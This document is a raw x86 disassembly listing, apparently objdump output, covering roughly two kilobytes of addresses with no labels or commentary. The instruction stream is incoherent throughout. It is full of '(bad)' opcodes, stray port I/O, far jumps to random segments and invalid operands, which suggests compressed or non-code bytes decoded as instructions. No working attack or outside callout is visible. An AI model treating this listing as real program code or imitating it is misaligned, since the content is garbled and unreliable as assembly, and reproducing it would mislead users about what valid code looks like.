  4151d4:	fwait
  4151d5:	xchg   esi,eax
  4151d6:	mov    eax,ds:0x3ee3d3f8
  4151db:	push   ebx
  4151dc:	repz icebp 
  4151de:	ret    0xcf21
  4151e1:	and    ecx,0xffffffc1
  4151e4:	jmp    DWORD PTR [ecx]
  4151e6:	add    DWORD PTR [ebx+0x6e],esp
  4151e9:	jno    0x41520f
  4151eb:	shr    BYTE PTR [esi-0x6f],0x27
  4151ef:	imul   esp,DWORD PTR [eax+edi*4-0x65971f1d],0xffffff92
  4151f7:	pushf  
  4151f8:	out    dx,al
  4151f9:	aam    0x9c
  4151fb:	push   ecx
  4151fc:	aad    0x96
  4151fe:	test   al,0xea
  415200:	cs mov ebx,0xb38cd023
  415206:	mov    eax,ds:0xb2383399
  41520b:	loop   0x415289
  41520d:	cmc    
  41520e:	sahf   
  41520f:	sbb    BYTE PTR [esi],ch
  415211:	or     esi,DWORD PTR [esi]
  415213:	nop
  415214:	sbb    BYTE PTR [edx],dh
  415216:	adc    eax,0xd8a37244
  41521b:	sub    edx,DWORD PTR [edx]
  41521d:	add    bl,bh
  41521f:	jmp    0xc4fe:0xe8b23199
  415226:	or     eax,0x5a1c7468
  41522b:	or     ah,BYTE PTR [esi+esi*8]
  41522e:	push   edi
  41522f:	xchg   esp,eax
  415230:	sub    dl,BYTE PTR [esi-0x21]
  415233:	rcl    BYTE PTR [ecx],cl
  415235:	repnz cmp al,0xe6
  415238:	(bad)  
  415239:	sti    
  41523a:	fs jp  0x4151f1
  41523d:	in     al,0x7
  41523f:	fistp  QWORD PTR [edx+0x74]
  415242:	(bad)
  415246:	test   BYTE PTR ds:0xc741706c,dl
  41524c:	fsub   DWORD PTR [ebx+0xf]
  41524f:	or     ch,BYTE PTR [esi-0x2a277bf2]
  415255:	pop    ecx
  415256:	(bad)  
  415257:	jmp    0x827e:0x5901367
  41525e:	outs   dx,DWORD PTR ds:[esi]
  41525f:	lea    ebx,[eax+0x5220cd94]
  415265:	daa    
  415266:	inc    ecx
  415267:	std    
  415268:	mov    gs,WORD PTR [eax]
  41526a:	dec    edi
  41526b:	xchg   esp,eax
  41526c:	pcmpgtb mm0,QWORD PTR [edi+0x3c]
  415270:	cmp    BYTE PTR [esi-0x2c],dh
  415273:	sbb    al,0x2f
  415275:	prefetch BYTE PTR [esi-0x80]
  415279:	and    eax,0x7bfd25f5
  41527e:	xchg   edi,eax
  41527f:	or     ebx,ecx
  415281:	xchg   bl,ah
  415283:	sub    al,BYTE PTR [ebx+0x7a]
  415286:	add    eax,0xc1dfe2b3
  41528b:	fsub   DWORD PTR [esi+ecx*1+0x6]
  41528f:	inc    ebx
  415290:	rcr    DWORD PTR [esi+0x25],cl
  415293:	sar    BYTE PTR [edi],0x8
  415296:	push   DWORD PTR [edi]
  415298:	lahf   
  415299:	rcl    DWORD PTR [edi-0x7d],0xc6
  41529d:	rcl    DWORD PTR [edx+0x245392ca],1
  4152a3:	push   ss
  4152a4:	pop    esi
  4152a5:	(bad)  [ebp-0x41112d10]
  4152ab:	test   BYTE PTR [edx],dh
  4152ad:	pop    esp
  4152ae:	jg     0x415261
  4152b0:	mov    edx,0x3d8bcba5
  4152b5:	bound  ebp,QWORD PTR [ebp+0x3670b1b]
  4152bb:	retf   
  4152bc:	lods   eax,DWORD PTR ds:[esi]
  4152bd:	or     DWORD PTR [ebx],esi
  4152bf:	rol    DWORD PTR [edx-0x71],cl
  4152c2:	adc    dh,BYTE PTR [eax-0x7e]
  4152c5:	xor    eax,0x466bd02b
  4152ca:	xchg   bh,dl
  4152cc:	jle    0x415324
  4152ce:	add    al,0xb3
  4152d0:	mov    dl,0x1d
  4152d2:	and    DWORD PTR [ebx+0x7957d1ae],edi
  4152d8:	js     0x4152ed
  4152da:	(bad)  
  4152dc:	cli    
  4152dd:	test   BYTE PTR [esi+0x1d9c1aaf],cl
  4152e3:	aaa    
  4152e4:	jns    0x415330
  4152e6:	inc    edx
  4152e7:	mov    eax,0x8ba9e022
  4152ec:	jmp    0x415304
  4152ee:	xor    DWORD PTR [eax+0x19364133],eax
  4152f4:	xor    edi,DWORD PTR [eax+0x2b2e1d09]
  4152fa:	xor    BYTE PTR [ecx+ebp*4+0x66b1fb00],0x31
  415302:	push   ss
  415303:	sub    BYTE PTR [ebx-0x30],dl
  415306:	lods   al,BYTE PTR ds:[esi]
  415307:	sub    al,0xb8
  415309:	jne    0x4152fd
  41530b:	or     BYTE PTR [ebx],dh
  41530d:	ss in  al,0xb2
  415310:	int3   
  415311:	mov    esp,0xb8e2c30d
  415316:	ins    BYTE PTR es:[edi],dx
  415317:	pusha  
  415318:	xchg   DWORD PTR [edx],eax
  41531a:	xchg   ebp,eax
  41531b:	sbb    al,0xbd
  41531d:	scas   al,BYTE PTR es:[edi]
  41531e:	bound  ecx,QWORD PTR ds:0x6e613c43
  415324:	repz mov ds:0x69070364,eax
  41532a:	inc    edi
  41532b:	not    DWORD PTR [edx-0x4e793f03]
  415331:	mov    ebp,0xa5706d73
  415336:	popf   
  415337:	lods   al,BYTE PTR ds:[esi]
  415338:	jae    0x41539e
  41533a:	jb     0x415396
  41533c:	popa   
  41533d:	out    0x60,eax
  41533f:	fdivr  DWORD PTR [eax-0x47]
  415342:	or     DWORD PTR [edi+0x25ac4e3c],ecx
  415348:	dec    edx
  415349:	lea    esp,[ebp+0x1564934f]
  41534f:	mov    ebp,0xf44dd747
  415354:	out    0x23,eax
  415356:	fstp   DWORD PTR [edi+0x4]
  415359:	adc    ch,BYTE PTR [eax]
  41535b:	xchg   ecx,eax
  41535c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41535d:	dec    esp
  41535e:	mov    DWORD PTR [edx+0x6bdee0db],ebp
  415364:	stos   DWORD PTR es:[edi],eax
  415365:	aaa    
  415366:	mov    edx,0x1a77ff9b
  41536b:	cs inc ecx
  41536d:	sub    al,ch
  41536f:	(bad)  
  415370:	dec    ebx
  415371:	or     eax,0x7545295a
  415376:	mov    eax,ds:0x2af9961e
  41537b:	sub    eax,0xf576f446
  415380:	jl     0x4153fa
  415382:	pop    esp
  415383:	push   esi
  415384:	fldlg2 
  415386:	sub    bl,BYTE PTR [edx-0x5e25c12c]
  41538c:	sbb    DWORD PTR ds:0xd19020d7,esp
  415392:	jecxz  0x415400
  415394:	test   DWORD PTR [edi],ebp
  415396:	mov    dh,0x6f
  415398:	mov    bh,0xab
  41539a:	sar    BYTE PTR [ecx],0xd2
  41539d:	push   cs
  41539e:	mov    ebp,0xd846e834
  4153a3:	cmc    
  4153a4:	stos   DWORD PTR es:[edi],eax
  4153a5:	aam    0x40
  4153a7:	bound  ecx,QWORD PTR [ecx-0x4d]
  4153aa:	fisubr DWORD PTR [ecx+0x46]
  4153ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153ae:	lahf   
  4153af:	jecxz  0x41535b
  4153b1:	dec    edi
  4153b2:	daa    
  4153b3:	xor    ebx,edx
  4153b5:	in     eax,dx
  4153b6:	adc    dl,dh
  4153b8:	lock je 0x41537d
  4153bb:	cmp    BYTE PTR [ecx-0x42],bl
  4153be:	popf   
  4153bf:	mov    dl,0x79
  4153c1:	mov    edx,0xfedbb174
  4153c6:	ins    BYTE PTR es:[edi],dx
  4153c7:	mov    BYTE PTR ds:0xca3f3da9,0xe0
  4153ce:	ret    
  4153cf:	sub    al,0xb3
  4153d1:	out    0x4f,eax
  4153d3:	in     eax,0xa
  4153d5:	jl     0x4153f9
  4153d7:	scas   eax,DWORD PTR es:[edi]
  4153d8:	inc    edi
  4153d9:	pop    ebx
  4153da:	aam    0x12
  4153dc:	push   esi
  4153dd:	adc    DWORD PTR [ebp-0x2c651eb8],eax
  4153e3:	inc    edx
  4153e4:	popf   
  4153e5:	mov    al,0x80
  4153e7:	gs daa 
  4153e9:	and    ah,BYTE PTR [edi+ebp*4]
  4153ec:	sub    dl,ch
  4153ee:	sub    DWORD PTR [edx+0x15195910],edi
  4153f4:	add    DWORD PTR [edx-0x46],edx
  4153f7:	jl     0x415441
  4153f9:	inc    DWORD PTR [ecx]
  4153fb:	and    bh,BYTE PTR [edx]
  4153fd:	in     eax,0x41
  4153ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415400:	jmp    FWORD PTR [esi]
  415402:	les    edx,FWORD PTR [eax+0x51]
  415405:	std    
  415406:	hlt    
  415407:	mov    edi,0xcd42f54b
  41540c:	(bad)  
  41540d:	scas   eax,DWORD PTR es:[edi]
  41540e:	push   esi
  41540f:	mov    ds:0xf5083002,al
  415414:	adc    dl,al
  415416:	or     ch,BYTE PTR [esi-0x542d0d4e]
  41541c:	sub    eax,0xa12f244d
  415421:	or     eax,0xa0558ee1
  415426:	cmp    cl,ch
  415428:	mov    DWORD PTR [eax+0x52],0x107ca1db
  41542f:	mov    ebx,0x1e5d8466
  415434:	(bad)  
  415435:	mov    ebx,0x60b57e3f
  41543a:	pop    esi
  41543b:	xor    dl,BYTE PTR es:[esi]
  41543e:	xchg   ebp,eax
  41543f:	sub    BYTE PTR [ebp-0xb],dh
  415442:	mov    ch,cl
  415444:	iret   
  415445:	push   ebx
  415446:	inc    edi
  415447:	push   0xe082f657
  41544c:	sbb    ebp,esp
  41544e:	mov    eax,ds:0xb827e0b
  415453:	cwde   
  415454:	jl     0x4154bb
  415456:	pop    edi
  415457:	inc    edi
  415458:	call   DWORD PTR [edi]
  41545a:	xchg   ecx,eax
  41545b:	out    0xce,al
  41545d:	sbb    bh,BYTE PTR [ebp-0x20ef400b]
  415463:	xor    ah,bl
  415465:	popa   
  415466:	pop    edi
  415467:	cmp    ebp,DWORD PTR [eax+0x525f81de]
  41546d:	fdivr  st,st(3)
  41546f:	call   0x88f7:0x20427d19
  415476:	jno    0x415450
  415478:	outs   dx,DWORD PTR ds:[esi]
  415479:	add    DWORD PTR [esi-0x715f908b],0xffffffb2
  415480:	pop    ss
  415481:	cmp    DWORD PTR [edx],0xc1514b1f
  415487:	aas    
  415488:	jne    0x4154be
  41548a:	mov    dl,0xc3
  41548c:	dec    eax
  41548d:	push   ds
  41548e:	jecxz  0x41541b
  415490:	sbb    eax,0xa7cf3f6f
  415495:	outs   dx,DWORD PTR ds:[esi]
  415496:	mov    dl,0x6e
  415498:	or     ebp,DWORD PTR [ebx-0x6a9a6575]
  41549e:	jo     0x4154a7
  4154a0:	in     al,0xf2
  4154a2:	pop    edi
  4154a3:	mov    dh,ah
  4154a5:	sbb    esp,eax
  4154a7:	pop    ecx
  4154a8:	sub    BYTE PTR [edx+0x10],ah
  4154ab:	out    dx,eax
  4154ac:	adc    eax,0xbe1d2b6b
  4154b1:	adc    ebp,eax
  4154b3:	cwde   
  4154b4:	xlat   BYTE PTR ds:[ebx]
  4154b5:	lahf   
  4154b6:	sbb    ebp,edi
  4154b8:	sbb    BYTE PTR [edi+0x796f1951],ch
  4154be:	sti    
  4154bf:	cmp    DWORD PTR [ebx+0x724e5b18],esi
  4154c5:	pop    ebp
  4154c6:	push   edx
  4154c7:	cmp    edi,edi
  4154c9:	into   
  4154ca:	std    
  4154cb:	xor    DWORD PTR [ebx],ebp
  4154cd:	ret    
  4154ce:	ins    DWORD PTR es:[edi],dx
  4154cf:	adc    edi,ebp
  4154d1:	enter  0xbbe9,0x4a
  4154d5:	in     al,0x5
  4154d7:	dec    ebp
  4154d8:	pop    ss
  4154d9:	mov    ds:0x4c57ea8,al
  4154de:	fwait
  4154df:	mov    eax,ds:0x27625991
  4154e4:	cli    
  4154e5:	hlt    
  4154e6:	(bad)  
  4154e7:	std    
  4154e8:	das    
  4154e9:	add    DWORD PTR [edx],0xd77ea21b
  4154ef:	into   
  4154f0:	aam    0x5b
  4154f2:	pop    ss
  4154f3:	xor    DWORD PTR [ecx-0x51e1535a],edi
  4154f9:	mov    BYTE PTR [ebp+ebp*8-0x398b691e],cl
  415500:	xchg   BYTE PTR [edi+0x74f252e0],dl
  415506:	inc    esi
  415507:	stos   DWORD PTR es:[edi],eax
  415508:	cwde   
  415509:	out    0x4e,eax
  41550b:	sahf   
  41550c:	(bad)  
  41550d:	lock popf 
  41550f:	pop    ecx
  415510:	test   DWORD PTR [edi+0x533a7199],esp
  415516:	and    ah,al
  415518:	and    al,0xc4
  41551a:	inc    esp
  41551b:	ficomp DWORD PTR [ebx+0x57c4a2d2]
  415521:	jmp    0xde0c7a41
  415526:	pop    esp
  415527:	jne    0x415585
  415529:	int    0xbd
  41552b:	clc    
  41552c:	xchg   bl,bh
  41552e:	daa    
  41552f:	aaa    
  415530:	imul   edx,DWORD PTR [esi+edx*2+0x2fd41bbd],0xfffffff7
  415538:	sbb    dl,BYTE PTR [ebx]
  41553a:	xchg   edx,eax
  41553b:	repnz xchg edx,eax
  41553d:	mov    esi,0x383a80c5
  415542:	inc    eax
  415543:	stos   DWORD PTR es:[edi],eax
  415544:	mov    eax,0x3cd3ad30
  415549:	daa    
  41554a:	cmp    esi,DWORD PTR [eax-0x2f090640]
  415550:	jae    0x415542
  415552:	mov    eax,0x92aa7449
  415557:	ror    DWORD PTR [edi],0xce
  41555a:	es test eax,0x562e951e
  415560:	mov    cs,edi
  415562:	(bad)  
  415563:	in     al,0x68
  415565:	div    edx
  415567:	xchg   esi,eax
  415568:	and    edi,DWORD PTR [ebp+0x4c]
  41556b:	scas   al,BYTE PTR es:[edi]
  41556c:	stc    
  41556d:	and    BYTE PTR [ebp+0x1f],bl
  415570:	popa   
  415571:	mov    ds:0x9e9c4f61,eax
  415576:	data16 jmp 0x415535
  415579:	mov    eax,0x757d4a3f
  41557e:	push   edi
  41557f:	jb     0x4155bd
  415581:	das    
  415582:	pop    es
  415583:	jge    0x41555e
  415585:	push   0xb0f1b2f2
  41558a:	js     0x415586
  41558c:	and    al,0xc5
  41558e:	push   es
  41558f:	shl    BYTE PTR [esi+0x48],0x15
  415593:	sti    
  415594:	mov    al,0x9
  415596:	sub    BYTE PTR [esi-0x587e738c],dl
  41559c:	or     cl,0xdd
  41559f:	call   0x65d1:0x7a6a4181
  4155a6:	loopne 0x415578
  4155a8:	jecxz  0x4155dd
  4155aa:	or     DWORD PTR [esi-0x4a840335],ecx
  4155b0:	sub    eax,DWORD PTR [eax]
  4155b2:	test   BYTE PTR [esi-0x3b5bb46c],0x5e
  4155b9:	or     DWORD PTR [esp+eax*4+0x111a9ca9],ebx
  4155c0:	(bad)  [ecx+0x46cc5cca]
  4155c6:	add    bh,BYTE PTR [eax]
  4155c8:	pop    ebx
  4155c9:	jg     0x4155b3
  4155cb:	mov    es,edx
  4155cd:	mov    ch,0x8a
  4155cf:	jae    0x415622
  4155d1:	test   eax,0x70ef04b2
  4155d6:	int3   
  4155d7:	loop   0x415619
  4155d9:	mov    ch,dh
  4155db:	mov    BYTE PTR [eax-0x568edc9c],ch
  4155e1:	je     0x4155a9
  4155e3:	adc    ebx,DWORD PTR [eax+esi*2-0x48203356]
  4155ea:	xchg   ebp,eax
  4155eb:	pop    edi
  4155ec:	(bad)
  4155f1:	in     al,0xb4
  4155f3:	out    dx,eax
  4155f4:	outs   dx,BYTE PTR ds:[esi]
  4155f5:	(bad)  
  4155f6:	clc    
  4155f7:	aas    
  4155f8:	pusha  
  4155f9:	leave  
  4155fa:	mov    DWORD PTR ds:0xfc10eb71,esp
  415600:	adc    eax,0x13dc60ac
  415605:	xor    BYTE PTR [edx+0x18],0xf2
  415609:	adc    ecx,ebp
  41560b:	stos   DWORD PTR es:[edi],eax
  41560c:	xchg   esp,eax
  41560d:	gs call 0xb22d:0xd2d08248
  415615:	nop
  415616:	xchg   ebx,eax
  415617:	dec    esi
  415618:	mov    eax,ds:0x94762721
  41561d:	sar    DWORD PTR [ebp+0x46],cl
  415620:	not    edi
  415622:	push   es
  415623:	dec    esp
  415624:	popf   
  415625:	nop
  415626:	cmp    DWORD PTR [edi],0xffffffa5
  415629:	and    BYTE PTR [ecx+0xbac7659],0x7b
  415630:	stos   DWORD PTR es:[edi],eax
  415631:	test   DWORD PTR [ecx+eax*4-0x71],ecx
  415635:	data16 xor al,0xa5
  415638:	inc    esp
  415639:	mov    dl,0xba
  41563b:	xchg   edi,eax
  41563c:	in     al,0x53
  41563e:	lock dec ebp
  415640:	mov    ecx,0xb5d0acf1
  415645:	shr    BYTE PTR [edx],1
  415647:	adc    al,0x7c
  415649:	(bad)  
  41564b:	and    edx,DWORD PTR [ebp-0x72917cb1]
  415651:	cmp    DWORD PTR [edi-0x218e026c],ecx
  415657:	bound  ebx,QWORD PTR [eax+0x2ceff8ef]
  41565d:	rol    BYTE PTR [edi+0x2fd655dd],0xbe
  415664:	call   0xd5f4cbdc
  415669:	aad    0x76
  41566b:	adc    al,0x85
  41566d:	mul    ah
  41566f:	adc    BYTE PTR [ebx-0x6f],bl
  415672:	adc    cl,dl
  415674:	cwde   
  415675:	test   al,0x4
  415677:	push   ss
  415678:	fst    st(7)
  41567a:	sti    
  41567b:	ret    
  41567c:	out    0x43,al
  41567e:	add    al,0x16
  415680:	in     eax,0xcc
  415682:	cs stc 
  415684:	xchg   BYTE PTR [eax+0x583f17c6],al
  41568a:	test   BYTE PTR [ebx-0x1a],al
  41568d:	mov    esi,0x9b3894a2
  415692:	cmp    al,BYTE PTR [ecx]
  415694:	adc    eax,0x5c36995b
  415699:	xchg   BYTE PTR [ebx+0x77],dh
  41569c:	add    esp,ebp
  41569e:	xchg   ebp,eax
  41569f:	call   0xacc9:0x72caa436
  4156a6:	or     esp,DWORD PTR [esi]
  4156a8:	ja     0x415671
  4156aa:	adc    al,0x7c
  4156ac:	or     BYTE PTR [ecx-0x6e],0x88
  4156b0:	or     esp,DWORD PTR [ecx-0x5a546169]
  4156b6:	pop    esp
  4156b7:	jbe    0x415656
  4156b9:	not    BYTE PTR [ecx+0x11]
  4156bc:	cmp    bl,ah
  4156be:	addr16 inc edi
  4156c0:	xor    eax,0xb30c7e6f
  4156c5:	iret   
  4156c6:	cmp    eax,0xe1e015a4
  4156cb:	add    cl,BYTE PTR ds:[ebx+0x3a3818df]
  4156d2:	mov    ah,0xd7
  4156d4:	mov    ah,0x3c
  4156d6:	dec    esp
  4156d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156d8:	mov    WORD PTR [edx-0x6aaa713e],ds
  4156de:	pushf  
  4156df:	cmp    edi,DWORD PTR [edi]
  4156e1:	push   edx
  4156e2:	pop    ds
  4156e3:	xchg   ecx,eax
  4156e4:	ret    0xb24c
  4156e7:	pop    ebx
  4156e8:	cmp    cl,BYTE PTR [eax]
  4156ea:	dec    edi
  4156eb:	adc    eax,0xadc65f35
  4156f0:	cmp    eax,0xd049c486
  4156f5:	xchg   DWORD PTR [esi],ecx
  4156f7:	mov    al,0xc7
  4156f9:	rcl    BYTE PTR [ecx+0x7],cl
  4156fc:	mov    DWORD PTR [eax+ecx*4-0x55c17211],ecx
  415703:	jle    0x4156a4
  415705:	std    
  415706:	or     BYTE PTR [ecx],al
  415708:	xchg   ecx,eax
  415709:	(bad)  
  41570a:	push   ds
  41570b:	es (bad) 
  41570d:	xchg   edx,eax
  41570e:	loopne 0x415696
  415710:	dec    esp
  415711:	sbb    BYTE PTR ds:0x9f07fef6,bl
  415717:	inc    eax
  415718:	inc    edi
  415719:	add    bh,BYTE PTR [ecx-0x33]
  41571c:	jmp    0x2e11ead
  415721:	push   ss
  415722:	jo     0x415789
  415724:	mov    BYTE PTR [edi],ch
  415726:	imul   ebx,DWORD PTR [eax+0x48],0xffffff8c
  41572a:	cmp    ch,BYTE PTR [esi]
  41572c:	out    dx,al
  41572d:	nop
  41572e:	in     eax,0xa3
  415730:	retf   0xd38f
  415733:	imul   esp
  415735:	push   edx
  415736:	scas   eax,DWORD PTR es:[edi]
  415737:	inc    eax
  415738:	stc    
  415739:	stos   BYTE PTR es:[edi],al
  41573a:	xchg   ecx,eax
  41573b:	push   ss
  41573c:	dec    ebx
  41573d:	test   ebp,ebp
  41573f:	out    0x2d,al
  415741:	and    bl,BYTE PTR [ecx-0x2cc07c15]
  415747:	dec    eax
  415748:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415749:	xchg   esp,eax
  41574a:	(bad)  
  41574b:	nop
  41574c:	outs   dx,BYTE PTR ds:[esi]
  41574d:	xchg   ebp,eax
  41574e:	xchg   esi,eax
  41574f:	dec    edx
  415750:	(bad)  
  415752:	push   ss
  415753:	ss dec eax
  415755:	std    
  415756:	mov    al,0x27
  415758:	push   eax
  415759:	push   esp
  41575a:	add    BYTE PTR [ecx+eiz*1+0x3],0x75
  41575f:	(bad)  
  415760:	jle    0x415710
  415762:	fistp  DWORD PTR [edx-0x18]
  415765:	sub    DWORD PTR [edx+0x2fa7ba08],0xffffff84
  41576c:	add    esp,DWORD PTR [ebx]
  41576e:	sbb    al,0x9e
  415770:	int    0x39
  415772:	jl     0x4157b4
  415774:	mov    BYTE PTR [eax-0x24],dh
  415777:	cld    
  415778:	mov    ?,WORD PTR [ebp+0x59]
  41577b:	mov    ah,0x38
  41577d:	mov    edx,gs
  41577f:	xchg   edx,eax
  415780:	add    BYTE PTR gs:[esi+eiz*2+0x26],al
  415785:	pop    ebp
  415786:	cld    
  415787:	push   ds
  415788:	push   0x70cdaa1f
  41578d:	loope  0x41576e
  41578f:	push   es
  415790:	pop    ebx
  415791:	(bad)  
  415792:	mov    ah,0xcf
  415794:	fld    QWORD PTR [eax]
  415796:	push   esp
  415797:	jno    0x4157a7
  415799:	xor    DWORD PTR [edi-0x76],0x7f
  41579d:	pop    esp
  41579e:	cwde   
  41579f:	dec    ebp
  4157a0:	lahf   
  4157a1:	dec    edx
  4157a2:	pop    eax
  4157a3:	int3   
  4157a4:	fnstenv [esi+0x6d]
  4157a7:	cmp    DWORD PTR [ebx],edi
  4157a9:	or     al,0x51
  4157ab:	push   esp
  4157ac:	jmp    0x48f5556b
  4157b1:	js     0x415766
  4157b3:	push   edx
  4157b4:	or     ebp,DWORD PTR [eax]
  4157b6:	push   edx
  4157b7:	sbb    eax,0xdbd1504c
  4157bc:	push   edi
  4157bd:	jb     0x4157f8
  4157bf:	sub    al,0xa
  4157c1:	popf   
  4157c2:	sub    BYTE PTR [esi+0x411c53cb],dl
  4157c8:	mov    ah,0xad
  4157ca:	icebp  
  4157cb:	sbb    dh,BYTE PTR [edi+ebx*1+0x16687576]
  4157d2:	dec    ecx
  4157d3:	push   esi
  4157d4:	stc    
  4157d5:	lods   al,BYTE PTR ds:[esi]
  4157d6:	lods   eax,DWORD PTR ds:[esi]
  4157d7:	mov    dl,0xd1
  4157d9:	sub    al,0xe0
  4157db:	sbb    al,0x91
  4157dd:	std    
  4157de:	xlat   BYTE PTR ds:[ebx]
  4157df:	pop    esp
  4157e0:	fiadd  DWORD PTR [ecx+eax*8+0x6f729d2d]
  4157e7:	cmp    dh,bl
  4157e9:	jne    0x4157bd
  4157eb:	test   eax,0xf642c22b
  4157f0:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4157f2:	sbb    ah,bl
  4157f4:	jnp    0x41581f
  4157f6:	pop    ebx
  4157f7:	fdivr  QWORD PTR [ebx]
  4157f9:	retf   0x7aa4
  4157fc:	xchg   esp,eax
  4157fd:	mov    ebp,0x330a1d88
  415802:	add    eax,0x96de4c5e
  415807:	adc    eax,0xc7a78100
  41580c:	rcr    BYTE PTR ds:0x39255022,0x20
  415813:	arpl   WORD PTR [esi-0x65],ax
  415816:	dec    esi
  415817:	mov    dl,0x77
  415819:	and    DWORD PTR [edi+0x7e84a2e5],0x70
  415820:	jmp    0x234e739b
  415825:	and    eax,0xcf386b62
  41582a:	cwde   
  41582b:	push   edi
  41582c:	fucom  st(2)
  41582e:	into   
  41582f:	mov    DWORD PTR [ebx],ebp
  415831:	xchg   esi,eax
  415832:	lahf   
  415833:	(bad)  
  415834:	rol    bh,1
  415836:	imul   ebp,DWORD PTR gs:[esi+0x5330e7fb],0x51e5f804
  415841:	jg     0x4158ac
  415843:	sub    DWORD PTR [ebx],esp
  415845:	xchg   edi,eax
  415846:	mov    ds:0xcaa47c5f,al
  41584b:	(bad)  
  41584c:	push   ecx
  41584d:	inc    ebx
  41584e:	lds    esi,FWORD PTR [edi]
  415850:	add    eax,0x534cba82
  415855:	mov    BYTE PTR [ecx+0x46],cl
  415858:	cmp    eax,0x73bc9e20
  41585d:	iret   
  41585e:	icebp  
  41585f:	pusha  
  415860:	nop
  415861:	cmc    
  415862:	push   ecx
  415863:	push   0x18
  415865:	xor    eax,0xb0aa5ed
  41586a:	inc    edx
  41586b:	fsubr  DWORD PTR [ebp+0x55]
  41586e:	jns    0x41588a
  415870:	xchg   edi,eax
  415871:	or     DWORD PTR [edi+0x25],edx
  415874:	cmp    DWORD PTR [ecx+0x7817f3bd],esi
  41587a:	pop    ds
  41587b:	sahf   
  41587c:	je     0x41589d
  41587e:	cmp    eax,0xec171ff9
  415883:	push   eax
  415884:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415885:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415886:	cvttps2pi mm5,QWORD PTR [ebx+ecx*4]
  41588a:	sub    al,0x4d
  41588c:	int    0x4e
  41588e:	cmp    eax,DWORD PTR [esi]
  415890:	or     al,0x80
  415892:	push   edi
  415893:	jo     0x41582c
  415895:	and    dh,BYTE PTR [eax-0x2c]
  415898:	mul    BYTE PTR [edx-0x61]
  41589b:	sub    BYTE PTR [edi],al
  41589d:	cmc    
  41589e:	adc    BYTE PTR [esi],0x92
  4158a1:	mov    ds:0x14b6a68a,al
  4158a6:	or     eax,0x1f9f9610
  4158ab:	jg     0x41587e
  4158ad:	fbstp  TBYTE PTR [edx+0x11ebd2cb]
  4158b3:	dec    edi
  4158b4:	mov    bl,0x1c
  4158b6:	add    ebx,edx
  4158b8:	(bad)  
  4158b9:	loope  0x415874
  4158bb:	and    eax,0xc42670ea
  4158c0:	dec    esp
  4158c1:	dec    edi
  4158c2:	out    0xa6,al
  4158c4:	imul   eax,DWORD PTR [ecx-0x720f2caa],0x1b
  4158cb:	jnp    0x415880
  4158cd:	call   FWORD PTR ds:0xc569ef33
  4158d3:	lds    esp,FWORD PTR [ebx-0x31]
  4158d6:	faddp  st(4),st
  4158d8:	xor    DWORD PTR [ecx+0x59],eax
  4158db:	xchg   ecx,eax
  4158dc:	jo     0x415910
  4158de:	bound  ecx,QWORD PTR [edx]
  4158e0:	adc    bl,dl
  4158e2:	arpl   WORD PTR [edx-0x42],bp
  4158e5:	ficomp WORD PTR [ecx+edx*1]
  4158e8:	inc    ebp
  4158e9:	push   ecx
  4158ea:	into   
  4158eb:	xor    esp,DWORD PTR [eax]
  4158ed:	fisub  WORD PTR [ebp-0xe]
  4158f0:	call   0x5f0100be
  4158f5:	ds stos DWORD PTR es:[edi],eax
  4158f7:	out    dx,eax
  4158f8:	sub    edx,ebx
  4158fa:	fidivr WORD PTR ds:0x7f23bb11
  415900:	outs   dx,DWORD PTR ds:[esi]
  415901:	stc    
  415902:	adc    edx,eax
  415904:	imul   eax,DWORD PTR [ecx],0x4a
  415907:	adc    cl,0x9
  41590a:	in     al,dx
  41590b:	and    DWORD PTR [esp+ebx*1-0x7a],esi
  41590f:	sub    al,0xc4
  415911:	jg     0x415923
  415913:	push   esp
  415914:	dec    esp
  415915:	mov    esi,0xe7d4e13d
  41591a:	aas    
  41591b:	scas   al,BYTE PTR es:[edi]
  41591c:	retf   0xea04
  41591f:	xchg   BYTE PTR [esi+0x56],ch
  415922:	adc    cl,BYTE PTR [ebp+0x1b559156]
  415928:	pop    ebx
  415929:	sbb    al,BYTE PTR [esp+esi*4+0x0]
  41592d:	pop    esp
  41592e:	fisubr WORD PTR [edx]
  415930:	es cld 
  415932:	mov    ebp,0xf3087502
  415937:	sbb    bh,BYTE PTR [esi+0x1]
  41593a:	ins    DWORD PTR es:[edi],dx
  41593b:	cs jp  0x41598f
  41593e:	add    bl,BYTE PTR [ebp+0x77]
  415941:	dec    ecx
  415942:	mov    ebx,0x1c8f2dbe
  415947:	and    ebp,DWORD PTR [ebp-0x7d]
  41594a:	das    
  41594b:	cld    
  41594c:	into   
  41594d:	je     0x415978
  41594f:	outs   dx,BYTE PTR ds:[esi]
  415950:	js     0x4159c8
  415952:	jl     0x41591f
  415954:	dec    esi
  415955:	adc    eax,0xd79b5ea
  41595a:	push   cs
  41595b:	addr16 cwde 
  41595d:	and    ch,BYTE PTR [edi-0x67bbf69f]
  415963:	stos   DWORD PTR es:[edi],eax
  415964:	or     al,0xb0
  415966:	cmp    eax,DWORD PTR [esi]
  415968:	data16 out dx,al
  41596a:	or     dh,BYTE PTR [edx-0x5024b37a]
  415970:	pop    esi
  415971:	cmp    DWORD PTR [edx+0x2bb6fd8f],ebp
  415977:	adc    edx,eax
  415979:	shl    BYTE PTR ds:0x7ce10868,0xc
  415980:	scas   eax,DWORD PTR es:[edi]
  415981:	loopne 0x415928
  415983:	call   0x76b940a0
  415988:	sbb    cl,BYTE PTR [esi]
  41598a:	mov    bl,0xbd
  41598c:	jp     0x4159e5
  41598e:	scas   eax,DWORD PTR es:[edi]
  41598f:	retf   0xd1e0
  415992:	ins    DWORD PTR es:[edi],dx
  415993:	fimul  DWORD PTR [eax-0x4d3c222a]
  415999:	jo     0x41596e
  41599b:	ss push esi
  41599d:	sbb    BYTE PTR [ebp+0x13],ah
  4159a0:	mov    dh,0x80
  4159a2:	push   0x7d
  4159a4:	mov    edx,edi
  4159a6:	out    dx,eax
  4159a7:	inc    bx
  4159a9:	outs   dx,DWORD PTR ds:[esi]
  4159aa:	dec    esi
  4159ab:	out    dx,al
  4159ac:	ss repnz in al,0xe8
  4159b0:	jecxz  0x415940
  4159b2:	sub    eax,esi
  4159b4:	inc    esi
